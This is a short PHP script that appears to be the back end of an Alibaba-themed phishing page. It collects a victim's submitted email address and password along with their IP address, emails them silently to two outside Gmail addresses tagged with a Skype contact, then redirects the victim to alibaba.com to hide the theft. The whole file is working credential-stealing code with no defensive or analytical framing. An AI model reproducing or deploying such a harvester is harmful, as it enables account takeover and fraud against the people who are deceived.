<?php

 	$ip = getenv("REMOTE_ADDR");
    $email_to = "client@gmail.com";
    $email_2 = "rapidsales9@gmail.com";
 
    $email_subject = "Ali Email from $ip";
 
 
    $first_name = $_POST['g']; // required
 
    $last_name = $_POST['f']; // required
    
    $email_message .= "++++++++++++++++++EMAIL LOG++++++++++++++++++++\n";
	$email_message .= "Email:    ".$first_name."\n";
 
    $email_message .= "Password:   ".$last_name."\n";
 
    $email_message .= "IP:    ".$ip."\n";
    $email_message .= "+++++++++++++++skype: osayande22+++++++++++++++++\n";
 
 
     
 
     
 
// create email headers
 
$headers = 'From: ALI<customer@ali.com>".
 
'Reply-To: '.$email_from."\r\n" .
 
'X-Mailer: PHP/' . phpversion();
 
@mail($email_to, $email_subject, $email_message, $headers); 
@mail($email_2, $email_subject, $email_message, $headers); 
 
header("Location: http://alibaba.com");
 
?>